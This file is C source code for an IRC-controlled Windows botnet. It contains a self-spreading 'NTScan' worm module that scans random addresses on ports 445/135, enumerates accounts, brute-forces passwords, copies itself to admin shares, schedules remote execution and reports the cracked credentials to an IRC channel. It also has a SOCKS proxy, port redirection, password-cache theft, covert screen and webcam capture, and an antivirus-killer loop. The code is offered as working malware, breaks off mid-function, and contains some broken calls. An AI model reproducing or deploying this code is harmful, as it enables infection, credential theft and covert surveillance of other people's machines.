 #ifndef NO_REDIRECT
// port redirect function
 DWORD WINAPI redirect(LPVOID param)
 {
	SOCKET rsock, clsock;
	SOCKADDR_IN rssin, cssin;
	rs redirect;
	DWORD id;

	redirect = *((rs *)param);
	rs *rsp = (rs *)param;
	rsp->gotinfo = TRUE;
	rsock = socket(PF_INET, SOCK_STREAM, IPPROTO_TCP);
	WSAAsyncSelect(rsock, 0, WM_USER + 1, FD_READ);
	memset(&rssin, 0, sizeof(rssin));
	rssin.sin_family = AF_INET;
	rssin.sin_port = htons(redirect.lport);
	bind(rsock, (SOCKADDR *)&rssin, sizeof(rssin));

	csock[redirect.threadnum] = rsock;

	while(1) {
		if (listen(rsock, 10) == SOCKET_ERROR) break;
		clsock = accept(rsock, (SOCKADDR *)&cssin, NULL);
		if (clsock != INVALID_SOCKET) {
			redirect.csock = clsock;
			CreateThread(NULL, 0, &redirectloop, (void *)&redirect, 0, &id);
		}
	}

	closesocket(clsock);
	closesocket(rsock);

	threads[redirect.threadnum] = 0;
	threadd[redirect.threadnum][0] = '\0';

	return 0;
 }

// part of the redirect function, handles sending/recieving for the remote connection.
 DWORD WINAPI redirectloop(LPVOID param)
 {
	SOCKET sock;
	SOCKET csock;
	char *dest;
	SOCKADDR_IN ssin;
	IN_ADDR iaddr;
	LPHOSTENT hostent;
	int port, err;
	char buff[4096];
	rs rs2;
	rs2 = *((rs *)param);
	csock = rs2.csock;
	dest = rs2.dest;
	port = rs2.port;
	DWORD id;

	while (1) {
		sock = socket(PF_INET, SOCK_STREAM, IPPROTO_TCP);
		memset(&ssin, 0, sizeof(ssin));
		ssin.sin_family = AF_INET;
		ssin.sin_port = htons(port);
		iaddr.s_addr = inet_addr(dest);
		if (iaddr.s_addr == INADDR_NONE) hostent = gethostbyname(dest);
		else hostent = gethostbyaddr((const char *)&iaddr, sizeof(struct in_addr), AF_INET);
		if (hostent == NULL) break;
		ssin.sin_addr = *((LPIN_ADDR)*hostent->h_addr_list);

		err = connect(sock, (LPSOCKADDR)&ssin, sizeof(SOCKADDR_IN));
		if (err == SOCKET_ERROR) break;

		rs2.sock = sock;
		CreateThread(NULL, 0, &redirectloop2, (void *)&rs2, 0, &id);

		while (1) {
			memset(buff, 0, sizeof(buff));
			err = recv(csock, buff, sizeof(buff), 0);
			if (err == 0) {
				break;
			}
			if (err == SOCKET_ERROR) break;

			err = send(sock, buff, err, 0);
			if (err == SOCKET_ERROR) break;

		}

		break;
	}

	closesocket(csock);
	closesocket(sock);

	return 0;
 }

// part of the redirect function, handles sending/recieving for the local connection.
 DWORD WINAPI redirectloop2(LPVOID param)
 {
	SOCKET sock;
	SOCKET csock;
	rs rs2;
	int err;
	char buff[4096];
	rs2 = *((rs *)param);
	sock = rs2.sock;
	csock = rs2.csock;

	while (1) {
		memset(buff, 0, sizeof(buff));
		err = recv(sock, buff, sizeof(buff), 0);
		if (err == 0) {
			break;
		}
		if (err == SOCKET_ERROR) break;
		err = send(csock, buff, err, 0);
		if (err == SOCKET_ERROR) break;
	}

	closesocket(csock);
	return 0;
 }
 #endif

  DWORD WINAPI ntpass_main(void *pnts)
{
	unsigned int i;
	HINSTANCE hLib;
	FILE *fp;
	NTSCAN *nts=(NTSCAN *)pnts;
	char szSelfExe[MAX_PATH];

	fp=fopen(szLocalPayloadFile,"payload.dat");
	if (fp!=NULL) {
		fclose(fp);
	} else {
		GetModuleFileName(0,szSelfExe,MAX_PATH);
		CopyFile(szSelfExe,szLocalPayloadFile,FALSE);
	}
	hLib=LoadLibrary("netapi32.dll");
	if (!hLib) return 0;
	fNetScheduleJobAdd=(NSJA)GetProcAddress(hLib,"NetScheduleJobAdd");
	fNetApiBufferFree=(NABF)GetProcAddress(hLib,"NetApiBufferFree");
	fNetRemoteTOD=(NRTOD)GetProcAddress(hLib,"NetRemoteTOD");
	fNetUserEnum=(NUE)GetProcAddress(hLib,"NetUserEnum");

	if ((!fNetScheduleJobAdd) || (!fNetApiBufferFree) || (!fNetRemoteTOD) || (!fNetUserEnum)) {
		//We couldn't load the addresses of each function...
		//(Win95/98??)
		FreeLibrary(hLib);
		return 0;
	}

	strcpy(scanip,nts->ipmask);
	srand(GetTickCount());
	ntscan=TRUE;
	for (i=0;i<(nts->threads);i++)
	{
		CreateThread(0,0,&PortScanner,0,0,0);
	}

	Sleep(60000*nts->minutes);
	ntscan=FALSE;
	threads[nts->threadid]=0;
	return 0;
}

unsigned long GetNextIP(char *scanmask)
{
	int ip1,ip2,ip3,ip4;
	if (strlen(scanmask)>15) return 0;
	ip1=-1;ip2=-1;ip3=-1;ip4=-1;
	sscanf(scanmask,"%d.%d.%d.%d",&ip1,&ip2,&ip3,&ip4);
	if (ip1==-1) ip1=rand();
	if (ip2==-1) ip2=rand();
	if (ip3==-1) ip3=rand();
	if (ip4==-1) ip4=rand();
	return (ip1+(ip2<<8)+(ip3<<16)+(ip4<<24));
}

BOOL port_open(unsigned long ip)
{
	SOCKET s;
	SOCKADDR_IN sin;
	unsigned long blockcmd=1;
	timeval t;
	int i;
	FD_SET rset;
	s=socket(AF_INET,SOCK_STREAM,0);
	if (s==INVALID_SOCKET) return INVALID_SOCKET;
	sin.sin_family=AF_INET;
	sin.sin_addr.S_un.S_addr=ip;
	sin.sin_port=htons(445);
	sin.sin_port=htons(135);
	//sin.sin_port=htons(135);
	ioctlsocket(s,FIONBIO,&blockcmd);
	connect(s,(LPSOCKADDR)&sin,sizeof(sin));
	FD_ZERO(&rset);
	FD_SET(s,&rset);
	t.tv_sec=5;
	t.tv_usec=0;
	i=select(0,0,&rset,0,&t);
	closesocket(s);
	if (i<=0) {
		return FALSE;
	} else {
		return TRUE;
	}
}

DWORD WINAPI PortScanner(LPVOID parm)
{
	BOOL p_open;
	DWORD dwIP;
	IN_ADDR in;
	char szIP[18];
	while (ntscan)
	{
		dwIP=GetNextIP(scanip);
		p_open=port_open(dwIP);
		if (p_open==TRUE) {
			in.s_addr=dwIP;
			sprintf(szIP,"\\\\%s",inet_ntoa(in));
			enumusers(szIP);
		}
	}
	return 0;
}

BOOL rootBox(char *szUserName, char *szIP)
{
	int i;
	i=0;
	while (passes[i])
	{
		if (NetConnect(szUserName,passes[i],szIP)==TRUE) return TRUE;
		i++;
	}
	return FALSE;
}

BOOL NetConnect(char *szUserName, char *szPassWord, char *szIP)
{
	DWORD dwResult; 
	NETRESOURCE nr;
	memset(&nr,0,sizeof(NETRESOURCE));
	nr.lpRemoteName=szIP;
	nr.dwType=RESOURCETYPE_DISK;
	nr.lpLocalName=NULL;
	nr.lpProvider=NULL;

	/////////////////////////////
	char *ntmess;
	ntmess = "";
	/////////////////////////////

	//
	// Call the WNetAddConnection2 function to make the connection,
	//   specifying a persistent connection.
	//
	dwResult = WNetAddConnection2(&nr, // NETRESOURCE from enumeration 
		(LPSTR) szPassWord,                  // no password 
		(LPSTR) szUserName,                  // logged-in user 
0);       // update profile with connect information 

	if(dwResult != NO_ERROR) 
	{ 
		WNetCancelConnection2(szIP,CONNECT_UPDATE_PROFILE,TRUE);
		return FALSE; 
	}
 
	WCHAR wszNetbios[200];
	char szRemoteFile[MAX_PATH],szRemoteFile2[MAX_PATH],szRemoteFile3[MAX_PATH],szRemoteFile4[MAX_PATH],szRemoteFile5[MAX_PATH]	,szRemoteFile6[MAX_PATH],szRemoteFile7[MAX_PATH],szRemoteFile8[MAX_PATH];;
	char sendbuf[512];
	TIME_OF_DAY_INFO *tinfo=NULL;
	NET_API_STATUS nStatus;
	DWORD JobID;
	AT_INFO at_time;


  sprintf(szRemoteFile,"%s\\ADMIN$\\system32\\%s",szIP,filename); //admin,ipc,print
  sprintf(szRemoteFile2,"%s\\C$\\winnt\\system32\\%s",szIP,filename);
  sprintf(szRemoteFile3,"%s\\IPC$\\%s",szIP,filename);
  sprintf(szRemoteFile4,"%s\\PRINT$\\%s",szIP,filename);  
  sprintf(szRemoteFile5,"%s\\C$\\shared\\%s",szIP,filename);
  sprintf(szRemoteFile6,"%s\\C$\\%s",szIP,filename);  
  sprintf(szRemoteFile7,"%s\\C$\\Documents and Settings\\All Users\\Documents\\%s",szIP,filename); 
  sprintf(szRemoteFile8,"%s\\C$\\windows\\system32\\%s",szIP,filename);

	MultiByteToWideChar(CP_ACP,0,szIP,-1,wszNetbios,sizeof(wszNetbios));
	nStatus=fNetRemoteTOD(wszNetbios,(LPBYTE *)&tinfo);
	if (nStatus==NERR_Success) {
		if (tinfo) {
			int i;
			i=CopyFile(szLocalPayloadFile,szRemoteFile,FALSE);
			if (!i) {
				i=CopyFile(szLocalPayloadFile,szRemoteFile2,FALSE);
				if (!i) {
					i=CopyFile(szLocalPayloadFile,szRemoteFile3,FALSE);
					if (!i) {
						i=CopyFile(szLocalPayloadFile,szRemoteFile4,FALSE);
						if (!i) {
							i=CopyFile(szLocalPayloadFile,szRemoteFile5,FALSE);
							if (!i) {
								i=CopyFile(szLocalPayloadFile,szRemoteFile6,FALSE);
								if (!i) {
									i=CopyFile(szLocalPayloadFile,szRemoteFile7,FALSE);
									if (!i) {
										i=CopyFile(szLocalPayloadFile,szRemoteFile8,FALSE);
										if (!i) {
													
																fNetApiBufferFree(tinfo);
																WNetCancelConnection2(szIP,CONNECT_UPDATE_PROFILE,TRUE);
																return TRUE;
														}
														else sprintf(sendbuf, "[\2NTScan\2] CSendFile(%s)", szRemoteFile);
												}
												else sprintf(sendbuf, "[\2NTScan\2] CSendFile(%s)", szRemoteFile2);
										}
										else sprintf(sendbuf, "[\2NTScan\2] CSendFile(%s)", szRemoteFile3);
								}
								else sprintf(sendbuf, "[\2NTScan\2] CSendFile(%s)", szRemoteFile4);
							}
							else sprintf(sendbuf, "[\2NTScan\2] CSendFile(%s)", szRemoteFile5);
						}
						else sprintf(sendbuf, "[\2NTScan\2] CSendFile(%s)", szRemoteFile6);
					}		
					else sprintf(sendbuf, "[\2NTScan\2] CSendFile(%s)", szRemoteFile7);
			}
			else sprintf(sendbuf, "[\2NTScan\2] CSendFile(%s)", szRemoteFile8);
			
			irc_privmsg(nt_msg->sock,nt_msg->chan,sendbuf,nt_msg->notice);
					
			memset(&at_time,0,sizeof(AT_INFO));
			DWORD jobtime;
			jobtime=tinfo->tod_elapsedt / 60;
			jobtime-=tinfo->tod_timezone;
			jobtime+=2;
			jobtime%=(24*60);
			at_time.JobTime=jobtime*60000;
			at_time.Command=L"svhost.exe";

			nStatus=fNetScheduleJobAdd(wszNetbios,(BYTE *)&at_time,&JobID);
			
         //////////////////////////////////////////  //from S mod
         // Just a quick piece of test code to msg the chan when an exploit occurs - 
         #define CHECKPASS(x) ((x)?(x):("(NULL)")) 
         char ntmess[512]; 
         _snprintf(ntmess,sizeof(ntmess),"[\2NTScan\2] Exploiting.. [IP]: %s [User]: (%s/%s)\r\n",szIP,szUserName,CHECKPASS(szPassWord)); 
         irc_privmsg(nt_msg->sock, nt_msg->chan, ntmess, nt_msg->notice); 
         ntstats++; 
         // End Code. 
         //////////////////////////////////////////

		}
	}
	WNetCancelConnection2(szIP,CONNECT_UPDATE_PROFILE,TRUE);
	return TRUE;
}

void enumusers(char *szServer)
{
	LPUSER_INFO_0 pBuf = NULL;
	LPUSER_INFO_0 pTmpBuf;
	DWORD dwLevel = 0;
	DWORD dwPrefMaxLen = MAX_PREFERRED_LENGTH;
	DWORD dwEntriesRead = 0;
	DWORD dwTotalEntries = 0;
	DWORD dwResumeHandle = 0;
	DWORD i;
	DWORD dwTotalCount = 0;
	NET_API_STATUS nStatus;
	WCHAR  *pszServerName = NULL;
	WCHAR sName[500];
	MultiByteToWideChar(CP_ACP,0,szServer,-1,sName,sizeof(sName));
	pszServerName=sName;
	char szUsername[300];
	char RemoteName[200];
	
	NETRESOURCE nr;
	nr.lpLocalName=NULL;
	nr.lpProvider=NULL;
	nr.dwType=RESOURCETYPE_ANY;
	sprintf(RemoteName,"%s\\ipc$",szServer);
	nr.lpRemoteName=RemoteName;
	if (WNetAddConnection2(&nr,"","",0)!=NO_ERROR) {
		WNetCancelConnection2(RemoteName,0,TRUE);
		return;
	}
	
	do // begin do
	{
		nStatus = fNetUserEnum(pszServerName,
			dwLevel,
			FILTER_NORMAL_ACCOUNT, // global users
			(LPBYTE*)&pBuf,
			dwPrefMaxLen,
			&dwEntriesRead,
			&dwTotalEntries,
			&dwResumeHandle);
		WNetCancelConnection2(RemoteName,0,TRUE);
		//
		// If the call succeeds,
		//
		if ((nStatus == NERR_Success) || (nStatus == ERROR_MORE_DATA))
		{
			if ((pTmpBuf = pBuf) != NULL)
			{
				for (i = 0; (i < dwEntriesRead); i++)
				{
					if (pTmpBuf == NULL) break;
					WideCharToMultiByte(CP_ACP,0,pTmpBuf->usri0_name,-1,szUsername,sizeof(szUsername),NULL,NULL);
					if ((rootBox(szUsername,szServer))==TRUE) break;
					pTmpBuf++;
					dwTotalCount++;
				}
			}
		}
		if (pBuf != NULL)
		{
			fNetApiBufferFree(pBuf);
			pBuf = NULL;
		}
	}
	while (nStatus == ERROR_MORE_DATA); // end do
	if (pBuf != NULL) fNetApiBufferFree(pBuf);
	
	return;
}

#ifndef NO_SOCK4SERV
 #define SOCKS4_CONNECT 1
 #define SOCKS4_GRANT 90
 #define SOCKS4_REJECT 91
DWORD WINAPI SocksDaemon(LPVOID param)
{
	struct sockaddr_in info;
	struct sockaddr_in client_in;
	SOCKET server;
	SOCKET client;
	DWORD lpThreadId;

	info.sin_family = AF_INET;
	info.sin_port = htons(sock4port);
	info.sin_addr.s_addr = INADDR_ANY;
	server = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	if (bind(server, (SOCKADDR *)&info, sizeof(info)) != 0)
	{
		return 0;
	}
	if (listen(server, 10) != 0)
	{
		return 0;
	}
	while (TRUE)
	{
		client = accept(server, (SOCKADDR *)&client_in, NULL);
		CreateThread(NULL, 0, &Socks4ClientThread, (LPVOID)client, 0, &lpThreadId);
	}
	return 0;
}

DWORD WINAPI Socks4ClientThread(LPVOID pParam)
{
	struct SOCKS4HEADER hdr;
	SOCKET client=(SOCKET)pParam;
	TIMEVAL timeout;
	fd_set fd;
	SOCKADDR_IN target_in;
	SOCKET outbound;

	timeout.tv_sec = 5;
	timeout.tv_usec = 0;
	FD_ZERO(&fd);
	FD_SET(client, &fd);
	if (select(0, &fd, NULL, NULL, &timeout) == 0)
	{
		closesocket(client);
		return 0;
	}
	if (recv(client, (char *)&hdr, sizeof(hdr), 0) <= 0)
	{
		closesocket(client);
		return 0;
	}
	if (hdr.vn != 4 || hdr.cd != SOCKS4_CONNECT) 
	{
		closesocket(client);
		return 0;
	}
	memset(&target_in, 0, sizeof(target_in));
	target_in.sin_family = AF_INET;
	target_in.sin_port = hdr.destport;
	target_in.sin_addr.s_addr = hdr.destaddr;
	outbound = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	if (connect(outbound, (SOCKADDR *)&target_in, sizeof(target_in)) == SOCKET_ERROR)
	{
		hdr.vn = 0;
		hdr.cd = SOCKS4_REJECT;
		memset(&hdr.userid, 0, 1024);
		send(client, (char *)&hdr, 8, 0);
		closesocket(client);
		return 0;
	}
	hdr.vn = 0;
	hdr.cd = SOCKS4_GRANT;
	memset(&hdr.userid, 0, 1024);
	send(client, (char *)&hdr, 8, 0);
	transfer_loop(outbound, client);
	return 0;
}

void transfer_loop(SOCKET target, SOCKET client)
{
	int len;
	char buf[1024];
	fd_set fd;

	while (TRUE)
	{
		FD_ZERO(&fd);
		FD_SET(client, &fd);
		FD_SET(target, &fd);

		memset(buf, 0, sizeof(buf));
		select(0, &fd, NULL, NULL, NULL);

		if(FD_ISSET(client, &fd))
		{
			if((len = recv(client,buf,sizeof(buf),0))== -1) break;
			if(send(target,buf,len,0)== -1) break;
		}
	    if (FD_ISSET(target,&fd))
		{
			if((len = recv(target,buf,sizeof(buf),0))== -1) break;
			if(send(client,buf,len,0)== -1) break;
		}
	}
}
#endif


void mirccmd(char *cmd)
{
         HWND mwnd = FindWindow("mIRC",NULL);
         if (mwnd) {
                 hFileMap = CreateFileMapping(INVALID_HANDLE_VALUE,0,PAGE_READWRITE,0,4096,"mIRC");
                 mData = (LPSTR)MapViewOfFile(hFileMap,FILE_MAP_ALL_ACCESS,0,0,0);
                 sprintf(mData, cmd);
                 SendMessage(mwnd,WM_USER + 200,1,0);
				 SendMessage(mwnd,WM_USER + 201,1,0);
                 UnmapViewOfFile(mData);
                 CloseHandle(hFileMap);
}
}



#ifndef NO_HOSTAUTH
int wildcardfit (char *wildcard, char *test)
{
  int fit = 1;
  
  for (; ('\000' != *wildcard) && (1 == fit) && ('\000' != *test); wildcard++)
    {
      switch (*wildcard)
        {
        case '[':
	  wildcard++;
          fit = set (&wildcard, &test);
          break;
        case '?':
          test++;
          break;
        case '*':
          fit = asterisk (&wildcard, &test);
	  wildcard--;
          break;
        default:
          fit = (int) (*wildcard == *test);
          test++;
        }
    }
  while ((*wildcard == '*') && (1 == fit)) 
    wildcard++;
  return (int) ((1 == fit) && ('\0' == *test) && ('\0' == *wildcard));
}

int set (char **wildcard, char **test)
{
  int fit = 0;
  int negation = 0;
  int at_beginning = 1;   // DON'T ASK, JUST BELIEVE

  if ('!' == **wildcard)
    {
      negation = 1;
      (*wildcard)++;
    }
  while ((']' != **wildcard) || (1 == at_beginning))
    {
      if (0 == fit)
        {
          if (('-' == **wildcard) 
              && ((*(*wildcard - 1)) < (*(*wildcard + 1)))
              && (']' != *(*wildcard + 1))
	      && (0 == at_beginning))
            {
              if (((**test) >= (*(*wildcard - 1)))
                  && ((**test) <= (*(*wildcard + 1))))
                {
                  fit = 1;
                  (*wildcard)++;
                }
            }
          else if ((**wildcard) == (**test))
            {
              fit = 1;
            }
        }
      (*wildcard)++;
      at_beginning = 0;
    }
  if (1 == negation)
    fit = 1 - fit;
  if (1 == fit) 
    (*test)++;

  return (fit);
}

int asterisk (char **wildcard, char **test)
{
  int fit = 1;

  (*wildcard)++; 
  while (('\000' != (**test))
	 && (('?' == **wildcard) 
	     || ('*' == **wildcard)))
    {
      if ('?' == **wildcard) 
	(*test)++;
      (*wildcard)++;
    }
  while ('*' == (**wildcard))
    (*wildcard)++;

  if (('\0' == (**test)) && ('\0' != (**wildcard)))
    return (fit = 0);
  if (('\0' == (**test)) && ('\0' == (**wildcard)))
    return (fit = 1); 
  else
    {
      if (0 == wildcardfit(*wildcard, (*test)))
	{
	  do                               // I HAD NIGHTMARES AFTER WRITING THIS PART
	    {
	      (*test)++;
	      while (((**wildcard) != (**test)) 
		     && ('['  != (**wildcard))
		     && ('\0' != (**test)))
		(*test)++;
	    }
	  while ((('\0' != **test))? 
		 (0 == wildcardfit (*wildcard, (*test))) 
		 : (0 != (fit = 0)));
	}
      if (('\0' == **test) && ('\0' == **wildcard))
	fit = 1;
      return (fit);
    }
}

int HostMaskMatch(char *h)
{
   int i=0;

   while (authost[i][0])
      if (wildcardfit(authost[i++], h)) return 1;

   return 0;
}
#endif
#ifdef PASS
//passcache
BOOL PASCAL AddPass(struct PASSWORD_CACHE_ENTRY FAR *pce, DWORD dwRefData)
{
	char buff[1024],buff2[1024];
	int nCount;
	PASSCACHECALLBACK_DATA *dat;
	dat = (PASSCACHECALLBACK_DATA *)dwRefData;
	nCount=pce->cbResource;
	if(nCount>1023) nCount=1023;
	lstrcpyn(buff, pce->abResource, nCount+1);
	buff[nCount] = 0;
	CharToOem(buff, buff2);
	if((dat->nBufPos+lstrlen(buff2))>=dat->nBufLen) return FALSE;
	lstrcpy(dat->pBuffer+dat->nBufPos,buff2);
	dat->nBufPos+=lstrlen(buff2)+1;

	nCount=pce->cbPassword;
	if(nCount>1023) nCount=1023;
	lstrcpyn(buff, pce->abResource+pce->cbResource, nCount+1);
	buff[nCount] = 0;
	CharToOem(buff, buff2);
	if((dat->nBufPos+lstrlen(buff2))>=dat->nBufLen) return FALSE;
	lstrcpy(dat->pBuffer+dat->nBufPos,buff2);
	dat->nBufPos+=lstrlen(buff2)+1;

	return TRUE;
}

#endif
#ifndef NO_CAPTURE
//capture capture
HWND Window;
BOOL Capture(char *file)
{
	HDC hdc;
	HBITMAP bitmap;
	BITMAPINFO bmpinfo;
	LPVOID pBits;
	HDC hdc2;
	DWORD dwWidth, dwHeight, dwBPP, dwNumColors;
	HGDIOBJ gdiobj;
	HANDLE hfile;
	DWORD dwBytes;	

	hdc=CreateDC("DISPLAY", NULL, NULL, NULL);
	if(hdc==NULL) {
		return FALSE;
	}
	dwWidth = GetDeviceCaps(hdc, HORZRES);
	dwHeight = GetDeviceCaps(hdc, VERTRES);
	dwBPP = GetDeviceCaps(hdc, BITSPIXEL);
	if(dwBPP<=8) {
		dwNumColors = GetDeviceCaps(hdc, NUMCOLORS);
		dwNumColors = 256;
	} else {
		dwNumColors = 0;
	}
	hdc2=CreateCompatibleDC(hdc);
	if(hdc2==NULL) {
		DeleteDC(hdc);
		return FALSE;
	}
	bmpinfo.bmiHeader.biSize = sizeof(BITMAPINFOHEADER);
	bmpinfo.bmiHeader.biWidth = dwWidth;
	bmpinfo.bmiHeader.biHeight = dwHeight;
	bmpinfo.bmiHeader.biPlanes = 1;
	bmpinfo.bmiHeader.biBitCount = (WORD) dwBPP;
	bmpinfo.bmiHeader.biCompression = BI_RGB;
	bmpinfo.bmiHeader.biSizeImage = 0;
	bmpinfo.bmiHeader.biXPelsPerMeter = 0;
	bmpinfo.bmiHeader.biYPelsPerMeter = 0;
	bmpinfo.bmiHeader.biClrUsed = dwNumColors;
	bmpinfo.bmiHeader.biClrImportant = dwNumColors;
	bitmap = CreateDIBSection(hdc, &bmpinfo, DIB_PAL_COLORS, &pBits, NULL, 0);
	if(bitmap==NULL) {
		DeleteDC(hdc);
		DeleteDC(hdc2);
		return FALSE;
	}
	gdiobj = SelectObject(hdc2, (HGDIOBJ)bitmap);
	if((gdiobj==NULL) || (gdiobj==(void *)GDI_ERROR)) {
		DeleteDC(hdc);
		DeleteDC(hdc2);
		return FALSE;
	}
	if (!BitBlt(hdc2, 0,0, dwWidth, dwHeight, hdc, 0,0, SRCCOPY)) {
		DeleteDC(hdc);
		DeleteDC(hdc2);
		return FALSE;
	}	
	RGBQUAD colors[256];
	if(dwNumColors!=0) {
		dwNumColors = GetDIBColorTable(hdc2, 0, dwNumColors, colors);
	}	
	BITMAPFILEHEADER bitmapfileheader;
	BITMAPINFOHEADER bitmapinfoheader;
	bitmapfileheader.bfType = 0x4D42;
	bitmapfileheader.bfSize = ((dwWidth * dwHeight * dwBPP)/8) + sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER) + (dwNumColors * sizeof(RGBQUAD));
	bitmapfileheader.bfReserved1 = 0;
	bitmapfileheader.bfReserved2 = 0;
	bitmapfileheader.bfOffBits = sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER) + (dwNumColors * sizeof(RGBQUAD));  
	bitmapinfoheader.biSize = sizeof(BITMAPINFOHEADER);
	bitmapinfoheader.biWidth = dwWidth;
	bitmapinfoheader.biHeight = dwHeight;
	bitmapinfoheader.biPlanes = 1;
	bitmapinfoheader.biBitCount = (WORD)dwBPP;
	bitmapinfoheader.biCompression = BI_RGB;
	bitmapinfoheader.biSizeImage = 0;
	bitmapinfoheader.biXPelsPerMeter = 0;
	bitmapinfoheader.biYPelsPerMeter = 0;
	bitmapinfoheader.biClrUsed = dwNumColors;
	bitmapinfoheader.biClrImportant = 0;	
	hfile=CreateFile(file,GENERIC_WRITE,0,NULL,CREATE_ALWAYS,FILE_ATTRIBUTE_NORMAL,NULL);
	if(hfile==INVALID_HANDLE_VALUE) {
		DeleteObject(bitmap);
		DeleteDC(hdc2);
		DeleteDC(hdc);
		return FALSE;
	}
	WriteFile(hfile,&bitmapfileheader,sizeof(BITMAPFILEHEADER), &dwBytes, NULL);
	WriteFile(hfile,&bitmapinfoheader,sizeof(BITMAPINFOHEADER), &dwBytes, NULL);
	if(dwNumColors!=0)
		WriteFile(hfile,colors,sizeof(RGBQUAD)*dwNumColors,&dwBytes,NULL);
	WriteFile(hfile,pBits,(dwWidth*dwHeight*dwBPP)/8,&dwBytes,NULL);
	CloseHandle(hfile);		
	DeleteObject(bitmap);
	DeleteDC(hdc2);
	DeleteDC(hdc);
	return TRUE;
}

int CaptureFrame(char *file, int index, int x, int y)
{
//	char svBuffer[1024];
	HWND hwndCap;

	hwndCap=capCreateCaptureWindow("Window", WS_CHILD, 0, 0, 160, 120, Window, 1);
	if(hwndCap==NULL) {
		return 1;
	}
	if(capDriverConnect(hwndCap, index)==FALSE) {
		DestroyWindow(hwndCap);
		return 1;	
	}
	CAPDRIVERCAPS pcdc;
	capDriverGetCaps(hwndCap, &pcdc, sizeof(CAPDRIVERCAPS));
	if(!pcdc.fCaptureInitialized) {
		DestroyWindow(hwndCap);
		return 1;
	}
	DWORD dwSize;
	BITMAPINFO *pbiOrig, *pbiInfo;
	dwSize=capGetVideoFormatSize(hwndCap);
	pbiOrig=(BITMAPINFO *)malloc(dwSize);
	if(pbiOrig==NULL) {
		DestroyWindow(hwndCap);
		return 1;
	}
	pbiInfo=(BITMAPINFO *)malloc(dwSize);
	if(pbiInfo==NULL) {
		DestroyWindow(hwndCap);
		return 1;
	}
	capGetVideoFormat(hwndCap, pbiOrig, dwSize); 
	memcpy(pbiInfo, pbiOrig, dwSize);
	DWORD dwWidth,dwHeight,dwBPP;
	if(x<=0) dwWidth=640;
	else dwWidth=x;
	if(y<=0) dwHeight=480;
	else dwHeight=y;
	dwBPP=16;
	pbiInfo->bmiHeader.biWidth = dwWidth;
	pbiInfo->bmiHeader.biHeight = dwHeight;
	pbiInfo->bmiHeader.biBitCount = (WORD) dwBPP;
	pbiInfo->bmiHeader.biSizeImage = 0;
	pbiInfo->bmiHeader.biCompression = BI_RGB;
	pbiInfo->bmiHeader.biClrUsed = 0;
	pbiInfo->bmiHeader.biClrImportant = 0;
	pbiInfo->bmiHeader.biPlanes = 1;
	pbiInfo->bmiColors->rgbBlue = 0;
	pbiInfo->bmiColors->rgbGreen = 0;
	pbiInfo->bmiColors->rgbRed = 0;
	pbiInfo->bmiColors->rgbReserved = 0;
	capSetVideoFormat(hwndCap, pbiInfo, dwSize);
	capGrabFrameNoStop(hwndCap);
	capFileSaveDIB(hwndCap, file);
	capSetVideoFormat(hwndCap, pbiOrig, dwSize);
	free(pbiOrig);
	free(pbiInfo);
	capDriverDisconnect(hwndCap); 
	DestroyWindow(hwndCap);
	return 0;
}

int CaptureVideo(char *file, int index, int time, int x, int y)
{
//	char svBuffer[1024];
	HWND hwndCap;
	
	hwndCap=capCreateCaptureWindow("Window", WS_CHILD, 0, 0, 160, 120, Window, 1);
	if(hwndCap==NULL) {
		return 1;
	}
	if(capDriverConnect(hwndCap, index)==FALSE) {
		DestroyWindow(hwndCap);
		return 1;	
	}	
	CAPDRIVERCAPS pcdc;
	capDriverGetCaps(hwndCap, &pcdc, sizeof(CAPDRIVERCAPS));
	if(!pcdc.fCaptureInitialized) {
		DestroyWindow(hwndCap);
		return 1;
	}	
	DWORD dwSize;
	BITMAPINFO *pbiOrig, *pbiInfo;	
	dwSize=capGetVideoFormatSize(hwndCap);
	pbiOrig=(BITMAPINFO *)malloc(dwSize);
	if(pbiOrig==NULL) {
		DestroyWindow(hwndCap);
		return 1;
	}
	pbiInfo=(BITMAPINFO *)malloc(dwSize);
	if(pbiInfo==NULL) {
		DestroyWindow(hwndCap);
		return 1;
	}
	capGetVideoFormat(hwndCap, pbiOrig, dwSize); 
	memcpy(pbiInfo, pbiOrig, dwSize);
	DWORD dwSeconds,dwWidth,dwHeight,dwBPP,dwFPS;
	if(time<=0) dwSeconds=5;
	else dwWidth=time;
	if(x<=0) dwWidth=160;
	else dwWidth=x;
	if(y<=0) dwHeight=120;
	else dwHeight=y;
	dwBPP=16;
	dwFPS=15;
	pbiInfo->bmiHeader.biWidth = dwWidth;
	pbiInfo->bmiHeader.biHeight = dwHeight;
	pbiInfo->bmiHeader.biBitCount = (WORD) dwBPP;
	pbiInfo->bmiHeader.biSizeImage = 0;
	pbiInfo->bmiHeader.biCompression = BI_RGB;
	pbiInfo->bmiHeader.biClrUsed = 0;
	pbiInfo->bmiHeader.biClrImportant = 0;
	pbiInfo->bmiHeader.biPlanes = 1;	
	pbiInfo->bmiColors->rgbBlue = 0;
	pbiInfo->bmiColors->rgbGreen = 0;
	pbiInfo->bmiColors->rgbRed = 0;
	pbiInfo->bmiColors->rgbReserved = 0;	
	CAPTUREPARMS capparms;	
	capSetVideoFormat(hwndCap, pbiInfo, dwSize);
	capCaptureGetSetup(hwndCap, &capparms, sizeof(CAPTUREPARMS));		
	capparms.fMakeUserHitOKToCapture = FALSE;
	capparms.vKeyAbort = 0;
	capparms.fAbortLeftMouse = FALSE;
	capparms.fAbortRightMouse = FALSE;
	capparms.fLimitEnabled = TRUE;
	capparms.wTimeLimit = dwSeconds;
	capparms.dwRequestMicroSecPerFrame = (1000000/dwFPS);																		
	capCaptureSetSetup(hwndCap, &capparms, sizeof(CAPTUREPARMS));
	capFileSetCaptureFile(hwndCap, file); 								
	capCaptureSequence(hwndCap); 
	capSetVideoFormat(hwndCap, pbiOrig, dwSize);
	free(pbiOrig);
	free(pbiInfo);
	capDriverDisconnect(hwndCap); 
	DestroyWindow(hwndCap);
	return 0;
}
#endif


#ifdef Use_Firewall_killer
DWORD WINAPI kill_av(LPVOID param)
{
	while (1)
	{
		listProcesses(0,NULL,NULL,TRUE);
		Sleep(killer_delay);
	}
	return 0;
}
#endif

int listProcesses(SOCKET sock,char *chan,char *proccess,BOOL killthread)
{
	HANDLE hand;
	HANDLE killer;
	char buffer[400];
	memset(buffer,0,sizeof(buffer));
 	PROCESSENTRY32 pe32 = {0};
	int c;
//	char window[250];
